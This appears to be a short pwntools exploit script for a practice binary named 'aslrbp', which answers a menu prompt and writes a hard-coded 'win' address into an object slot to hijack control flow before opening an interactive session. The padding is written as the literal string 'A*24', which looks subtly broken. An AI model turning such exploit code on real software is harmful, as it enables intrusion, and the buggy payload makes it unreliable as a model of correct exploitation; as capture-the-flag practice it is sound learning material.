from pwn import *

context.log_level = "DEBUG"
p = process(["./aslrbp", "./2"])


win = p64(0x10000075c)

p.sendlineafter(b">", b"2")
p.sendlineafter(b"slot (0-15) for ObjB:", b"0")
p.sendlineafter(b"ObjB data (32 bytes as string):", win+b"A*24")


p.interactive()


